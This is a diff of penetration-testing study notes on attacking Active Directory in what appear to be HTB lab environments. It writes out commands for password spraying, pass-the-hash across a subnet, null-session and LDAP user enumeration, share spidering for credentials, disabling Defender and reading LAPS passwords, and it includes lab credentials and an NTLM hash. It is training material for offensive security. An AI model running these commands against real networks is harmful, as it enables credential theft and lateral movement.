-**Local administrator password reuse:**
-```bash
-sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <hash> | grep +
-```
+### External Password Spraying
 
-The `--local-auth` flag attempts login once per machine, avoiding lockouts.
-
-**External Password Spraying:**
-
-Common external targets for password spraying with AD credentials:
+You can do this method with different services. Some common targets are:
 
 - Microsoft 0365
 - Outlook Web Exchange
@@ -3588,12 +3880,12 @@ Upload PowerView and import them, `Import-Module .\PowerView.ps1`.
 
 Create the password. PSCredential force to create a password as SecureString.
 ```
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString 'password_of_user_created(sergiky)' -AsPlainText -Force
 ```
 
 Build a credential object indicating a user and a password. When you use `-Credential $Cred` in another command, the command will be executed **for that user in the variable**, not for the user that is executing the command.
 ```
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('domain.local\user', $SecPassword)
 ```
 
 Create an Access Control Entry (ACE) for the ACL of the object of the domain
@@ -3723,45 +4015,168 @@ With `NT AUTHORITY\SYSTEM` on a domain machine, the computer can be impersonated
 
 ## Enumerating Password Policy
 
+If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy
+
+### Enumerating password policy from Linux
+
+With null session of SMB you can onbtain a listing of users, groups, computers, user account attributes and the domain password policy.
+
+With valid credentials:
 ```bash
-# With SMB credentials
-crackmapexec smb <IP> -u user -p pass --pass-pol
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+```
 
-# RPC null session
-rpcclient -U "" -N <IP>
+Without credentials we may be able to obtain password policy via SMB NULL or LDAP Anonymous.
+
+We can connect through rpcclient and use querydominfo to see information of the domain.
+
+```bash
+rpcclient -U "" -N 172.16.5.5
 querydominfo
+```
+
+To see the password policy you can use
+```bash
 getdompwinfo
+```
 
-# enum4linux
-enum4linux -P <IP>
-enum4linux-ng -P <IP> -oA output
+You can use **enum4linux**
+```
+enum4linux -P 172.16.5.5
+```
 
-# LDAP anonymous
-ldapsearch -h <IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+[+] Password Info for Domain: INLANEFREIGHT
 
-# Windows native
+...
+```
+
+The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of enum4linux in Python, but has additional features such as export data as YAML or JSON. It also supports colored output.
+
+```
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+```
+
+### Enum null session from Windows
+
+It is less common to do this type of attack from Windows, but you can use the following command to establish a null session.
+
+```
+net use \\DC01\ipc$ "" /u:""
+```
+
+Some common error:
+```
+C:\htb> net use \\DC01\ipc$ "" /u:guest
+System error 1331 has occurred.
+
+This user can't sign in because this account is currently disabled.
+```
+
+```
+net use \\DC01\ipc$ "password" /u:guest
+System error 1326 has occurred.
+
+The user name or password is incorrect.
+```
+
+```
+net use \\DC01\ipc$ "password" /u:guest
+System error 1909 has occurred.
+
+The referenced account is currently locked out and may not be logged on to.
+```
+
+### Enumerating password policy from Linux - LDAP Anonymous Bind
+
+Allow unauthenticated attackers to retrieve information from the domain, such as a list of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration,
+
+We can use tool like `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.
+
+#### ldapsearch
+
+With ldapsearch it can be a bit cumbersome but doable.
+
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+### Enumerate the password policy from windows
+
+```
 net accounts
+```
+
+`We do not want to be the pentester that locks out every account in the organization!`
+
+### PowerView
+
+This tool help us gain situational awareness within AD environment.
+
+```powershell
+import-module .\PowerView.ps1
+Get-DomainPolicy
 ```
 
 ---
 
 ## Enumerating Domain Users
 
+If you have SYSTEM in a machine you can easily query Active directory for users and password policy. If you don't obtain users, you can use external resources such as email harvesting and Linkedin
+
+### SMB Null session to pull user list
+
+Obtaining only the usernames
+```
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+```
+rpcclient -U "" -N 172.16.5.5
+```
+
+```
+crackmapexec smb 172.16.5.5 --users
+```
+
+### Gathering users with LDAP Anonymous
+
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+```
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+
+### Search domain admins
+
 ```bash
-# SMB null session
-enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-rpcclient -U "" -N <IP> → enumdomusers
-crackmapexec smb <IP> --users
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
 
-# LDAP anonymous
-ldapsearch -h <IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
-./windapsearch.py --dc-ip <IP> -u "" -U
+- `--da`: enumerate domain admins group memebers
 
-# Kerberos (no credentials, no logs)
-kerbrute userenum -d inlanefreight.local --dc <IP> /opt/jsmith.txt
+### Search privileged users
 
-# With credentials
-crackmapexec smb <IP> -u user -p pass --users
+```bash
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+- `-PU`: Recursive search for users with nested group membership.
+
+### Enumerate users with kerbrute
+
+```
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+```
+
+### With authenticated credentials
+
+You can ask directly to the AD
+
+```
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
 ---
@@ -3988,78 +4403,177 @@ If `root_squash` is not configured, it's possible to create a SUID binary on the
 
 ## SSH with Kerberos
 
-If SSH rejects password and shows `Permission denied (gssapi-keyex,gssapi-with-mic,password)`:
+### Login in ssh with kerberos
 
-1. Install `krb5-config` if it doesn't exist: `dpkg-reconfigure krb5-config`
-2. Configure `/etc/krb5.conf`:
+If you test to fail three times the password of ssh you see something like this:
+
+`Permission denied (gssapi-keyex,gssapi-with-mic,password)`
+
+This means that you need to use kerberos auth method to use ssh.
+
+You need to have installed **krb5 package**, this package have a configuration file in **/etc/krb5.conf**, if you don't see, you can create with `dpkg-reconfigure krb5-config`
+
+An example to create a valid configuration is this:
 ```
 [libdefaults]
-    default_realm = REALM.HTB
+	default_realm = REALCORP.HTB
+
 [realms]
-    REALM.HTB = {
-        kdc = srv01.realm.htb
-    }
+# use "kdc = ..." if realm admins haven't put SRV records into DNS
+	REALCORP.HTB = {
+		kdc = srv01.realcorp.htb
+	}
+
 [domain_realm]
-    .REALM.HTB = REALM.HTB
-    REALM.HTB = REALM.HTB
+	.REALCORP.HTB = REALCORP.HTB
+	REALCORP.HTB = REALCORP.HTB
 ```
-3. Get ticket:
+
+Then you follow the next command with **sudo**:
 ```bash
-sudo kdestroy
-sudo kinit <username>
-sudo klist
+sudo klist # Check if exist something
+sudo kdestroy # to delete the ticket
+sudo kinit <username> # Create a ticket with the username, you need the password
+sudo klist # to check if the new ticket was created
 ```
-4. Connect: `sudo ssh -o GSSAPIAuthentication=yes user@10.10.10.x`
+
+Now to use ssh you have to add the option and you don't need to introduce any password:
+```bash
+sudo ssh -o GSSAPIAuthentication=yes j.nakazawa@10.10.10.224
+```
+
+Example of use in Tentacle machine, [s4vitar writeup](https://www.youtube.com/watch?v=hFIWuWVIDek)
 
 ---
 
 ## Security Controls Enumeration
 
-**Windows Defender:**
-```powershell
-Get-MpComputerStatus | select RealTimeProtectionEnabled    # True = active
-Set-MpPreference -DisableRealtimeMonitoring $true          # disable (requires admin)
+### Windows Defender
+
+By default, will block tools such as `PowerView`.
+
+We can use `Get-MpComputerStatus` to see if `RealTimeProtectionEnabled` parameter is set to True, which means that Defender is enabled
+
+```
+Get-MpComputerStatus
+
+....
+RealTimeProtectionEnabled       : True
 ```
 
-**AppLocker:**
-```powershell
+### AppLocker
+
+An application whitelist is a list of approved software or executable allowed to be installed or run in a system.
+
+It is common to organisation to block `PowerShell.exe` and `cmd.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
+
+Sometimes, we run into more stringent `AppLocker` policies that require more creativity to bypass.
+
+Using `Get-AppLockerPolicy` to see the blocked Apps.
+```
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-# If it blocks PowerShell.exe, try alternative paths:
-# %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
-# PowerShell_ISE.exe
 ```
 
-**PowerShell Constrained Language Mode:**
+### PowerShell Constrained Language Mode
+
+PowerShell Constrained Language Mode locks down many features needed to use PowerShell effectively, such as COM objects, only allow approved .NET types, XAML-based workflows, PowerShell classes, and more.
+
+We can rapid enumerate if we are in a Full Language Mode or Constrained Language Mode.
+
 ```powershell
-$ExecutionContext.SessionState.LanguageMode    # FullLanguage vs ConstrainedLanguage
+$ExecutionContext.SessionState.LanguageMode
 ```
 
-**LAPS:**
+### LAPS
+
+This solutions is used to randomize and rotate the local administrador passwords. We can enumerate what domain users can read the LAPS password with LAPS installed and what machines do not have LAPS installed.
+
+The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) can check the permission of the object "Extended Rights / Security Descriptors" without be administrator.
+
+This will show groups specifically  delegated to read LAPS passwords, normally are protected groups.
+
+```
+Find-LAPSDelegatedGroups
+```
+
+The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enable for any groups with read access and users with "All Extended RIghts" can read LAPS passwords and may be less protected than users in delegated groups.
+```
+Find-AdmPwdExtendedRights
+```
+
+We can use `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if your user have access.
+
 ```powershell
-Find-LAPSDelegatedGroups       # groups with read permissions
-Find-AdmPwdExtendedRights      # users with "All Extended Rights"
-Get-LAPSComputers              # list computers with LAPS + passwords (if access)
+Get-LAPSComputers
 ```
 
 ---
 
 ## Credentialed Enumeration
 
-With low-privilege domain user credentials:
+### From Winux
 
-**CrackMapExec:**
-```bash
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
-# Results in: /tmp/cme_spider_plus/<IP>/
+To dig deeper we need to have low privilege domain user credentials.
+
+#### Crackmapexec
+
+You can use this tool with MSSQL, SMB, SSH and WinRM credentials.
+
+CME offer a help menu for each protocol.
+```
+crackmapexec smb -h
 ```
 
-**SMBMap with credentials:**
+Some flag that we're going to use:
+
+- -u Username `The user whose credentials we will use to authenticate`
+- -p Password `User's password`
+- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
+- --users `Specifies to enumerate Domain Users`
+- --groups `Specifies to enumerate domain groups`
+- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`
+
+We will start enumerating users and group asking to the Domain Controller.
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+
+The result include attributes as `badPwdCount` who help us when perform actions like targeted password spraying. This attribute tracks the number of consecutive failed login attempts.
+
+To obtain a list of domain groups we can use:
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+
+We can see users that are currently logged:
+```bash
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+```
+
+Enumerate shares resources:
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+
+We see that we can read in some files, so we can use the extension `spider_plus` to dig through each redeable share.
+
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+
+Now we can see the metadata information at `/tmp/cme_spider_plus/<ip of host>`. We can see interesting files which can contain passwords, PII or configuration files.
+
+#### SMBMap
+
+Check access:
 ```bash
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+```
+
+Do recursive listing of a resource:
+
+```bash
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 ```
 
@@ -4258,14 +4772,23 @@ portfwd add -R -l 8081 -p 1234 -L 10.10.14.18    # reverse portfwd
 
 ## Local Administrator Password Reuse
 
-If you obtain an NTLM hash or local admin password, it may be reused across multiple hosts:
+This is a quite noisy and is not a good choice for any assessments that require stealth.
+
+If you obtain the NTLM password hash or cleartext password for the local administrator account (or another privileged local account) you can attempt across multiple host.
+
+It is worth targeting high-value hosts such as `SQL` or `Microsoft Exchange` servers, as they are more likely to have highly privileged user.
+
+It is possible that have common format, for example: `$desktop%@admin123`, in servers can be `$server%@admin123`.
+
+Another situation is that a non-privileged user have the same password in another account such as `user-adm`. This is common among different domains.
+
+If we have the NTLM has we can spray it across an entire subnet.
+
+The `--local-auth` flag in crackmapexec will tell the tool only to attempt to log in one time on each machine which remove any risk of account lockout.
 
 ```bash
-# Spraying with NTLM hash (--local-auth avoids lockout — only 1 attempt per host):
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
-
-Common patterns: `$desktop%@admin123` (workstations), `$server%@admin123` (servers).
 
 ---
 
